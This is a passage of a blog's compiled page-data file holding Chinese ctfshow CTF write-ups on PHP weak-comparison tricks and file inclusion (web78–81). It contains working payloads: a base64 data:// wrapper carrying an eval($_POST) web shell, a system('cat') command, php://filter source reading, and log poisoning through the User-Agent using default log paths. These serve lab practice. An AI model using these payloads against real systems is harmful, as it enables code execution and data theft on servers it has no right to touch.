函数向数组尾部插入一个或多个元素。</p>\n</blockquote>\n<blockquote>\n<p>array_push(<em>array,value1,value2...</em>)</p>\n</blockquote>\n<blockquote>\n<p>$a=array(&quot;a&quot;=&gt;&quot;red&quot;,&quot;b&quot;=&gt;&quot;green&quot;);\narray_push($a,&quot;blue&quot;,&quot;yellow&quot;); 两种使用方式</p>\n</blockquote>\n<blockquote>\n<p>如果数组</p>\n</blockquote>\n<blockquote>\n<p>file_put_contents() 函数把一个字符串写入文件中。如果成功，该函数将返回写入文件中的字符数。如果失败，则返回 False。</p>\n</blockquote>\n<blockquote>\n<p>in_array — 检查数组中是否存在某个值{</p>\n</blockquote>\n<blockquote>\n<p>in_array(mixed $needle, array $haystack, bool $strict = false): bool</p>\n</blockquote>\n<blockquote>\n<p>大海捞针，在大海（haystack）中搜索针（ needle），如果没有设置 strict 则使用宽松的比较。 }36-846的随机写入数字 有一个概率问题 到底会有什么会在allow数组中 1的可能性是最大的</p>\n</blockquote>\n<blockquote>\n<p>这道题是弱比较类型所以 字符串类型绕过1.php==1</p>\n</blockquote>\n<blockquote>\n<p>通过post传参写入 rce</p>\n<p>然后访问2.php就行</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image029" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523710.png" data="aurora"></p>\n<h3 id="web100" tabindex="-1"><a class="header-anchor" href="#web100" aria-hidden="true">#</a> Web100</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image031" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523863.png" data="aurora"></p>\n<blockquote>\n<p>is_numeric — 检测变量是否为数字或数字字符串</p>\n</blockquote>\n<blockquote>\n<p>如果 <code>value</code> 是数字或<a href="https://www.php.net/manual/zh/language.types.numeric-strings.php" target="_blank" rel="noopener noreferrer">数字字符串<ExternalLinkIcon/></a>， 返回 <code>**true**</code>；否则返回 <code>**false**</code>。</p>\n</blockquote>\n<blockquote>\n<p>这里是个大坑 因为赋值运算优先于逻辑判断，且赋值运算逻辑为true 所以这个$v0与后面的$v2$v3无关</p>\n</blockquote>\n<blockquote>\n<p>还有$v2中不能出现； 考虑PHP语句最后一句可不加；直接闭合</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image033" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523123.png" data="aurora"></p>\n<blockquote>\n<p>正常RCE</p>\n</blockquote>\n<blockquote>\n<p>ctfshow{2d6dd5c50x2d8c980x2d4c3e0x2da10e0x2dc6b39863b5e2}</p>\n</blockquote>\n<blockquote>\n<p>0x2d=”-”</p>\n</blockquote>\n<blockquote>\n<p>ctfshow{2d6dd5c5-8c98-4c3e-a10e-c6b39863b5e2}</p>\n</blockquote>\n<h3 id="web101" tabindex="-1"><a class="header-anchor" href="#web101" aria-hidden="true">#</a> web101</h3>\n<blockquote>\n<p>考点：PHP 反射机制Reflection<a href="https://www.php.net/manual/zh/class.reflectionclass.php" target="_blank" rel="noopener noreferrer">PHP: ReflectionClass - Manual<ExternalLinkIcon/></a></p>\n</blockquote>\n<blockquote>\n<p><strong>ReflectionClass</strong> 类报告了一个类的有关信息。</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image035" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523714.png" data="aurora"></p>\n<blockquote>\n<p>这样可以echo出asd类中的属性及其方法</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image037" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523658.png" data="aurora"></p>\n<blockquote>\n<p>注意这次的flag值少了一位，自己猜一下</p>\n</blockquote>\n<h3 id="web102" tabindex="-1"><a class="header-anchor" href="#web102" aria-hidden="true">#</a> Web102</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="clip_image039" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523844.png" data="aurora"></p>\n<blockquote>\n<p>substr() 函数返回字符串的一部分。substr(string,start,length)</p>\n</blockquote>\n<blockquote>\n<p>call_user_func — 把第一个参数作为回调函数调用</p>\n</blockquote>\n',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/web/web3.html",pathLocale:"/",permalink:null,routeMeta:{},slug:"web3",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/web/web3.md",filePathRelative:"web/web3.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/web/web3.html.vue",componentFilePathRelative:"pages/web/web3.html.vue",componentFileChunkName:"v-d21174f4",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/web/web3.html.js",dataFilePathRelative:"pages/web/web3.html.js",dataFileChunkName:"v-d21174f4",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/web/web3.html",htmlFilePathRelative:"web/web3.html"},{data:{key:"v-cea7c3b6",path:"/web/web4.html",title:"文件包含刷题",lang:"zh-CN",frontmatter:{date:"2023/5/29 19:57",stick:!1,keyword:"misc,ctfshow",description:"刷题",title:"文件包含刷题",tag:["ctfshow刷题"],categories:["文件包含","歪比八卜"]},excerpt:"",headers:[{level:2,title:"文件包含",slug:"文件包含",children:[{level:3,title:"web78",slug:"web78",children:[]},{level:3,title:"Web79",slug:"web79",children:[]},{level:3,title:"Web80",slug:"web80",children:[]},{level:3,title:"Web81",slug:"web81",children:[]}]}],git:{}},key:"v-cea7c3b6",path:"/web/web4.html",title:"文件包含刷题",lang:"zh-CN",frontmatter:{date:"2023/5/29 19:57",stick:!1,keyword:"misc,ctfshow",description:"刷题",title:"文件包含刷题",tag:["ctfshow刷题"],categories:["文件包含","歪比八卜"]},excerpt:"",headers:[{level:2,title:"文件包含",slug:"文件包含",children:[{level:3,title:"web78",slug:"web78",children:[]},{level:3,title:"Web79",slug:"web79",children:[]},{level:3,title:"Web80",slug:"web80",children:[]},{level:3,title:"Web81",slug:"web81",children:[]}]}],content:'\r\n## 文件包含\r\n\r\n### web78\r\n\r\n![image-20230530144343183](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301443215.png)\r\n\r\n> 文件包含常规题 考虑伪协议绕过 这道题没有啥过滤的直接读就行\r\n>\r\n> payload：\r\n>\r\n> （1）?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==（base64过后的<?php eval($_POST[1]);）\r\n>\r\n> POST ：1=system("cat * f *");\r\n>\r\n> （2）?file=php://filter/convert.base64-encode/resource=flag.php\r\n\r\n### Web79\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301352058.png)\r\n\r\n> 该题目意思是将php replace成？？？所以无法直接包含flag.php \r\n>\r\n> 这边可以使用data伪协议绕过\r\n\r\n> 1.data协议\r\n\r\n> php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是PHP代码，就会执行代码\r\n\r\n> 使用方法:data://text/plain;base64,xxxx(base64编码后的数据)\r\n\r\n> data伪协议只有在php<5.3且include=on时可以写木马。\r\n\r\n> 2.php伪协议：\r\n\r\n> 需要开启allow_url_fopen的：php://input（post请求提交数据）、php://stdin、php://memory和php://temp\r\n\r\n> 不需要开启allow_wrl_fopen的：php://filter 用于读取源码\r\n\r\n> 经常使用的是php://filter 用于读取源码 和php://input 用于执行php代码\r\n\r\n### Web80\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301352092.png)\r\n\r\n> data 和 php 被过滤所以data和伪协议用不了\r\n\r\n> 用包含日志文件方法 大概意思就是\r\n>\r\n> 1、日志的默认路径\r\n\r\n>  /etc/httpd/logs/access_log或/var/log/httpd/access_log    //apache+linux\r\n\r\n>  nginx 日志文件在用户安装目录的logs目录下/var/log/nginx/access.log\r\n\r\n> 2、web中间件默认配置uoh文件\r\n\r\n> /etc/httpd/conf/httpd.conf或index.php?page=/etc/init.d/httpd    //apache+linux\r\n\r\n> C:/Windows/system32/inetsrv/metabase.xml     //iis6.0+win2003\r\n\r\n> C:WindowsSystem32inetsrvconfigapplicationHost.config      //iis7.0+win\r\n\r\n> 3、利用\r\n\r\n>  方法1 访问\r\n>\r\n> ```\r\n> http://www.xx.com/<?php phpinfo(); ?>时，<?php phpinfo(); ?>也会被记录在日志里，也可以插入到User-Agent；但是在日志里这句话被编码了；所以用Burp Suite修改来绕过编码；然后包含相应的日志文件：\r\n> ```\r\n\r\n> /var/log/nginx/access.log找到日志文件，并以php解析的方式打开\r\n\r\n> 方法2 可以添加php语句 到user_agent（User Agent中文名为用户代理，是Http协议中的一部分，属于头域的组成部分，User Agent也简称UA。它是一个特殊字符串头，是一种向访问网站提供你所使用的浏览器类型及版本、操作系统及版本、浏览器内核、等信息的标识。通过这个标 识，用户所访问的网站可以显示不同的排版从而为用户提供更好的体验或者进行信息统计；例如用手机访问谷歌和电脑访问是不一样的，这些是谷歌根据访问者的 UA来判断的。）中\r\n\r\n![image-20230530153049671](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301530825.png)\r\n\r\n### Web81\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301352097.png)\r\n\r\n> 多过滤了：不影响包含日志文件的尝试用上一题解决方法\r\n\r\n![img](https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301352122.png)\r\n\r\n> 一般都是能够通过日志包含来写的\r\n\r\n ',contentRendered:'<h2 id="文件包含" tabindex="-1"><a class="header-anchor" href="#文件包含" aria-hidden="true">#</a> 文件包含</h2>\n<h3 id="web78" tabindex="-1"><a class="header-anchor" href="#web78" aria-hidden="true">#</a> web78</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230530144343183" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301443215.png" data="aurora"></p>\n<blockquote>\n<p>文件包含常规题 考虑伪协议绕过 这道题没有啥过滤的直接读就行</p>\n<p>payload：</p>\n<p>（1）?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==（base64过后的&lt;?php eval($_POST[1]);）</p>\n<p>POST ：1=system(&quot;cat * f *&quot;);</p>\n<p>（2）?file=php://filter/convert.base64-encode/resource=flag.php</p>\n</blockquote>\n<h3 id="web79" tabindex="-1"><a class="header-anchor" href="#web79" aria-hidden="true">#</a> Web79</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301352058.png" data="aurora"></p>\n<blockquote>\n<p>该题目意思是将php replace成？？？所以无法直接包含flag.php</p>\n<p>这边可以使用data伪协议绕过</p>\n</blockquote>\n<blockquote>\n<p>1.data协议</p>\n</blockquote>\n<blockquote>\n<p>php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是PHP代码，就会执行代码</p>\n</blockquote>\n<blockquote>\n<p>使用方法:data://text/plain;base64,xxxx(base64编码后的数据)</p>\n</blockquote>\n<blockquote>\n<p>data伪协议只有在php&lt;5.3且include=on时可以写木马。</p>\n</blockquote>\n<blockquote>\n<p>2.php伪协议：</p>\n</blockquote>\n<blockquote>\n<p>需要开启allow_url_fopen的：php://input（post请求提交数据）、php://stdin、php://memory和php://temp</p>\n</blockquote>\n<blockquote>\n<p>不需要开启allow_wrl_fopen的：php://filter 用于读取源码</p>\n</blockquote>\n<blockquote>\n<p>经常使用的是php://filter 用于读取源码 和php://input 用于执行php代码</p>\n</blockquote>\n<h3 id="web80" tabindex="-1"><a class="header-anchor" href="#web80" aria-hidden="true">#</a> Web80</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301352092.png" data="aurora"></p>\n<blockquote>\n<p>data 和 php 被过滤所以data和伪协议用不了</p>\n</blockquote>\n<blockquote>\n<p>用包含日志文件方法 大概意思就是</p>\n<p>1、日志的默认路径</p>\n</blockquote>\n<blockquote>\n<p>/etc/httpd/logs/access_log或/var/log/httpd/access_log    //apache+linux</p>\n</blockquote>\n<blockquote>\n<p>nginx 日志文件在用户安装目录的logs目录下/var/log/nginx/access.log</p>\n</blockquote>\n<blockquote>\n<p>2、web中间件默认配置uoh文件</p>\n</blockquote>\n<blockquote>\n<p>/etc/httpd/conf/httpd.conf或index.php?page=/etc/init.d/httpd    //apache+linux</p>\n</blockquote>\n<blockquote>\n<p>C:/Windows/system32/inetsrv/metabase.xml     //iis6.0+win2003</p>\n</blockquote>\n<blockquote>\n<p>C:WindowsSystem32inetsrvconfigapplicationHost.config      //iis7.0+win</p>\n</blockquote>\n<blockquote>\n<p>3、利用</p>\n</blockquote>\n<blockquote>\n<p>方法1 访问</p>\n<div class="language-text ext-text line-numbers-mode"><pre v-pre class="language-text"><code>http://www.xx.com/&lt;?php phpinfo(); ?>时，&lt;?php phpinfo(); ?>也会被记录在日志里，也可以插入到User-Agent；但是在日志里这句话被编码了；所以用Burp Suite修改来绕过编码；然后包含相应的日志文件：\n</code></pre><div class="line-numbers"><span class="line-number">1</span><br></div></div></blockquote>\n<blockquote>\n<p>/var/log/nginx/access.log找到日志文件，并以php解析的方式打开</p>\n</blockquote>\n<blockquote>\n<p>方法2 可以添加php语句 到user_agent（User Agent中文名为用户代理，是Http协议中的一部分，属于头域的组成部分，User Agent也简称UA。它是一个特殊字符串头，是一种向访问网站提供你所使用的浏览器类型及版本、操作系统及版本、浏览器内核、等信息的标识。通过这个标 识，用户所访问的网站可以显示不同的排版从而为用户提供更好的体验或者进行信息统计；例如用手机访问谷歌和电脑访问是不一样的，这些是谷歌根据访问者的 UA来判断的。）中</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="image-20230530153049671" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301530825.png" data="aurora"></p>\n<h3 id="web81" tabindex="-1"><a class="header-anchor" href="#web81" aria-hidden="true">#</a> Web81</h3>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301352097.png" data="aurora"></p>\n<blockquote>\n<p>多过滤了：不影响包含日志文件的尝试用上一题解决方法</p>\n</blockquote>\n<p><img src="https://ooszy.cco.vin/img/blog-public/ljz.gif" alt="img" originSrc="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305301352122.png" data="aurora"></p>\n<blockquote>\n<p>一般都是能够通过日志包含来写的</p>\n</blockquote>\n',date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:"/web/web4.html",pathLocale:"/",permalink:null,routeMeta:{},slug:"web4",filePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/web/web4.md",filePathRelative:"web/web4.md",componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/web/web4.html.vue",componentFilePathRelative:"pages/web/web4.html.vue",componentFileChunkName:"v-cea7c3b6",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/web/web4.html.js",dataFilePathRelative:"pages/web/web4.html.js",dataFileChunkName:"v-cea7c3b6",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/web/web4.html",htmlFilePathRelative:"web/web4.html"},{data:{key:"v-3706649a",path:"/404.html",title:"",lang:"zh-CN",frontmatter:{layout:"404"},excerpt:"",headers:[],git:{}},key:"v-3706649a",path:"/404.html",title:"",lang:"zh-CN",frontmatter:{layout:"404"},excerpt:"",headers:[],content:"",contentRendered:"",date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:null,pathLocale:"/",permalink:null,routeMeta:{},slug:"",filePath:null,filePathRelative:null,componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/404.html.vue",componentFilePathRelative:"pages/404.html.vue",componentFileChunkName:"v-3706649a",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/404.html.js",dataFilePathRelative:"pages/404.html.js",dataFileChunkName:"v-3706649a",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/404.html",htmlFilePathRelative:"404.html"},{data:{key:"v-8daa1a0e",path:"/",title:"",lang:"zh-CN",frontmatter:{layout:"Layout",home:!0},excerpt:"",headers:[],git:{}},key:"v-8daa1a0e",path:"/",title:"",lang:"zh-CN",frontmatter:{layout:"Layout",home:!0},excerpt:"",headers:[],content:"",contentRendered:"",date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:null,pathLocale:"/",permalink:null,routeMeta:{},slug:"",filePath:null,filePathRelative:null,componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/index.html.vue",componentFilePathRelative:"pages/index.html.vue",componentFileChunkName:"v-8daa1a0e",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/index.html.js",dataFilePathRelative:"pages/index.html.js",dataFileChunkName:"v-8daa1a0e",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/index.html",htmlFilePathRelative:"index.html"},{data:{key:"v-74bc627b",path:"/about/",title:"",lang:"zh-CN",frontmatter:{layout:"About",slug:"aurora-about"},excerpt:"",headers:[],git:{}},key:"v-74bc627b",path:"/about/",title:"",lang:"zh-CN",frontmatter:{layout:"About",slug:"aurora-about"},excerpt:"",headers:[],content:"",contentRendered:"",date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:null,pathLocale:"/",permalink:null,routeMeta:{},slug:"",filePath:null,filePathRelative:null,componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/about/index.html.vue",componentFilePathRelative:"pages/about/index.html.vue",componentFileChunkName:"v-74bc627b",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/about/index.html.js",dataFilePathRelative:"pages/about/index.html.js",dataFileChunkName:"v-74bc627b",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/about/index.html",htmlFilePathRelative:"about/index.html"},{data:{key:"v-14f724bf",path:"/mood/",title:"",lang:"zh-CN",frontmatter:{layout:"Mood",slug:"aurora-mood"},excerpt:"",headers:[],git:{}},key:"v-14f724bf",path:"/mood/",title:"",lang:"zh-CN",frontmatter:{layout:"Mood",slug:"aurora-mood"},excerpt:"",headers:[],content:"",contentRendered:"",date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:null,pathLocale:"/",permalink:null,routeMeta:{},slug:"",filePath:null,filePathRelative:null,componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/mood/index.html.vue",componentFilePathRelative:"pages/mood/index.html.vue",componentFileChunkName:"v-14f724bf",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/mood/index.html.js",dataFilePathRelative:"pages/mood/index.html.js",dataFileChunkName:"v-14f724bf",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/mood/index.html",htmlFilePathRelative:"mood/index.html"},{data:{key:"v-14e6501c",path:"/link/",title:"",lang:"zh-CN",frontmatter:{layout:"Link",slug:"aurora-link"},excerpt:"",headers:[],git:{}},key:"v-14e6501c",path:"/link/",title:"",lang:"zh-CN",frontmatter:{layout:"Link",slug:"aurora-link"},excerpt:"",headers:[],content:"",contentRendered:"",date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:null,pathLocale:"/",permalink:null,routeMeta:{},slug:"",filePath:null,filePathRelative:null,componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/link/index.html.vue",componentFilePathRelative:"pages/link/index.html.vue",componentFileChunkName:"v-14e6501c",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/link/index.html.js",dataFilePathRelative:"pages/link/index.html.js",dataFileChunkName:"v-14e6501c",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/link/index.html",htmlFilePathRelative:"link/index.html"},{data:{key:"v-744d024e",path:"/tag/",title:"",lang:"zh-CN",frontmatter:{layout:"Tag",slug:"aurora-tag"},excerpt:"",headers:[],git:{}},key:"v-744d024e",path:"/tag/",title:"",lang:"zh-CN",frontmatter:{layout:"Tag",slug:"aurora-tag"},excerpt:"",headers:[],content:"",contentRendered:"",date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:null,pathLocale:"/",permalink:null,routeMeta:{},slug:"",filePath:null,filePathRelative:null,componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/tag/index.html.vue",componentFilePathRelative:"pages/tag/index.html.vue",componentFileChunkName:"v-744d024e",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/tag/index.html.js",dataFilePathRelative:"pages/tag/index.html.js",dataFileChunkName:"v-744d024e",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/tag/index.html",htmlFilePathRelative:"tag/index.html"},{data:{key:"v-705c21a6",path:"/archive/",title:"",lang:"zh-CN",frontmatter:{layout:"Archive",slug:"aurora-archive"},excerpt:"",headers:[],git:{}},key:"v-705c21a6",path:"/archive/",title:"",lang:"zh-CN",frontmatter:{layout:"Archive",slug:"aurora-archive"},excerpt:"",headers:[],content:"",contentRendered:"",date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:null,pathLocale:"/",permalink:null,routeMeta:{},slug:"",filePath:null,filePathRelative:null,componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/archive/index.html.vue",componentFilePathRelative:"pages/archive/index.html.vue",componentFileChunkName:"v-705c21a6",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/archive/index.html.js",dataFilePathRelative:"pages/archive/index.html.js",dataFileChunkName:"v-705c21a6",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/archive/index.html",htmlFilePathRelative:"archive/index.html"},{data:{key:"v-6629f178",path:"/aurora-coze/",title:"",lang:"zh-CN",frontmatter:{layout:"CozeMood",slug:"aurora-coze-mood"},excerpt:"",headers:[],git:{}},key:"v-6629f178",path:"/aurora-coze/",title:"",lang:"zh-CN",frontmatter:{layout:"CozeMood",slug:"aurora-coze-mood"},excerpt:"",headers:[],content:"",contentRendered:"",date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:null,pathLocale:"/",permalink:null,routeMeta:{},slug:"",filePath:null,filePathRelative:null,componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/aurora-coze/index.html.vue",componentFilePathRelative:"pages/aurora-coze/index.html.vue",componentFileChunkName:"v-6629f178",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/aurora-coze/index.html.js",dataFilePathRelative:"pages/aurora-coze/index.html.js",dataFileChunkName:"v-6629f178",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/aurora-coze/index.html",htmlFilePathRelative:"aurora-coze/index.html"},{data:{key:"v-031dfb13",path:"/register/",title:"",lang:"zh-CN",frontmatter:{layout:"RegisterUser",slug:"aurora-coze-register"},excerpt:"",headers:[],git:{}},key:"v-031dfb13",path:"/register/",title:"",lang:"zh-CN",frontmatter:{layout:"RegisterUser",slug:"aurora-coze-register"},excerpt:"",headers:[],content:"",contentRendered:"",date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:null,pathLocale:"/",permalink:null,routeMeta:{},slug:"",filePath:null,filePathRelative:null,componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/register/index.html.vue",componentFilePathRelative:"pages/register/index.html.vue",componentFileChunkName:"v-031dfb13",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/register/index.html.js",dataFilePathRelative:"pages/register/index.html.js",dataFileChunkName:"v-031dfb13",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/register/index.html",htmlFilePathRelative:"register/index.html"},{data:{key:"v-e2acc714",path:"/photo/",title:"",lang:"zh-CN",frontmatter:{layout:"CozePhoto",slug:"aurora-photo"},excerpt:"",headers:[],git:{}},key:"v-e2acc714",path:"/photo/",title:"",lang:"zh-CN",frontmatter:{layout:"CozePhoto",slug:"aurora-photo"},excerpt:"",headers:[],content:"",contentRendered:"",date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:null,pathLocale:"/",permalink:null,routeMeta:{},slug:"",filePath:null,filePathRelative:null,componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/photo/index.html.vue",componentFilePathRelative:"pages/photo/index.html.vue",componentFileChunkName:"v-e2acc714",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/photo/index.html.js",dataFilePathRelative:"pages/photo/index.html.js",dataFileChunkName:"v-e2acc714",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/photo/index.html",htmlFilePathRelative:"photo/index.html"},{data:{key:"v-4382d077",path:"/next-mood/",title:"",lang:"zh-CN",frontmatter:{layout:"AuroraCozeMood",slug:"aurora-AuroraCozeMood"},excerpt:"",headers:[],git:{}},key:"v-4382d077",path:"/next-mood/",title:"",lang:"zh-CN",frontmatter:{layout:"AuroraCozeMood",slug:"aurora-AuroraCozeMood"},excerpt:"",headers:[],content:"",contentRendered:"",date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:null,pathLocale:"/",permalink:null,routeMeta:{},slug:"",filePath:null,filePathRelative:null,componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/next-mood/index.html.vue",componentFilePathRelative:"pages/next-mood/index.html.vue",componentFileChunkName:"v-4382d077",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/next-mood/index.html.js",dataFilePathRelative:"pages/next-mood/index.html.js",dataFileChunkName:"v-4382d077",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/next-mood/index.html",htmlFilePathRelative:"next-mood/index.html"},{data:{key:"v-3279cf61",path:"/aurora-archive/",title:"",lang:"zh-CN",frontmatter:{layout:"AuroraArchive",slug:"aurora-plugin-archive"},excerpt:"",headers:[],git:{}},key:"v-3279cf61",path:"/aurora-archive/",title:"",lang:"zh-CN",frontmatter:{layout:"AuroraArchive",slug:"aurora-plugin-archive"},excerpt:"",headers:[],content:"",contentRendered:"",date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:null,pathLocale:"/",permalink:null,routeMeta:{},slug:"",filePath:null,filePathRelative:null,componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/aurora-archive/index.html.vue",componentFilePathRelative:"pages/aurora-archive/index.html.vue",componentFileChunkName:"v-3279cf61",dataFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/aurora-archive/index.html.js",dataFilePathRelative:"pages/aurora-archive/index.html.js",dataFileChunkName:"v-3279cf61",htmlFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/dist/aurora-archive/index.html",htmlFilePathRelative:"aurora-archive/index.html"},{data:{key:"v-3c506944",path:"/aurora-music/",title:"",lang:"zh-CN",frontmatter:{layout:"AuroraMusic",slug:"aurora-plugin-music"},excerpt:"",headers:[],git:{}},key:"v-3c506944",path:"/aurora-music/",title:"",lang:"zh-CN",frontmatter:{layout:"AuroraMusic",slug:"aurora-plugin-music"},excerpt:"",headers:[],content:"",contentRendered:"",date:"0000-00-00",deps:[],hoistedTags:[],links:[],pathInferred:null,pathLocale:"/",permalink:null,routeMeta:{},slug:"",filePath:null,filePathRelative:null,componentFilePath:"E:/vue/aurora-blog-1.13.0/aurora-blog-1.13.0/reicalg/docs/.vuepress/.temp/pages/aurora-music/i